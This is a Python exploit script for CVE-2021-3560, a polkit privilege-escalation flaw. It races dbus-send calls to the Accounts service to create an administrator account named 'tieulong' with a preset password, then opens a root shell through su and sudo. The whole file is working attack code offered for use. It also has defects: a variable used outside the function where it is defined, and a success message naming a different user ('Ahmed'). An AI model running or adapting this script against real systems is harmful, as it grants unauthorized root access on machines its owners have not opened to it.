import os
import sys
import time
import subprocess
import random
import pwd

def print_header():
    print ("**************")
    print("Exploit: Privilege escalation with polkit - CVE-2021-3560")
    print ("**************")

def create_user(username):
    process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts','org.freedesktop.Accounts.CreateUser',f'string:{username}','string:"Nguyen Ngoc Tieu Long','int32:1'])
    try:
        Random = random.uniform(0.006, 0.009)
        process.wait(timeout=Random)
        process.kill()
    except subprocess.TimeoutExpired:
        process.kill()

def configure_user_password(username):
    uid = f"/org/freedesktop/Accounts/User{pwd.getpwnam(username).pw_uid}"
    password = "string:"
    process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply',uid,'org.freedesktop.Accounts.User.SetPassword',password,'string:GoldenEye'])
    try:
        Random = random.uniform(0.006, 0.009)
        process.wait(timeout=Random)
        process.kill()
    except subprocess.TimeoutExpired:
        process.kill()

def create_and_configure_user():
    print_header()
    print("[+] Starting the Exploit ")
    time.sleep(3)

    check = True
    counter = 0
    while check:
        counter += 1
        create_user('tieulong')
        user = subprocess.run(['id', 'tieulong'], stdout=subprocess.PIPE).stdout.decode('utf-8')
        if user.find("uid") != -1:
            print("[+] User Created with the name of tieulong")
            print("[+] Timed out at: " + str(Random))
            check = False
            break
        if counter > 2000:
            print("[-] Couldn't add the user, try again it may work")
            sys.exit(0)

    for i in range(200):
        configure_user_password('tieulong')

    print("[+] Timed out at: " + str(Random))
    print("[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su tieulong', and then 'sudo su' to root ")

    p = subprocess.call("(su tieulong -c 'sudo su')", shell=True)


# Call the function to execute the code
if __name__ == "__main__":
    create_and_configure_user()
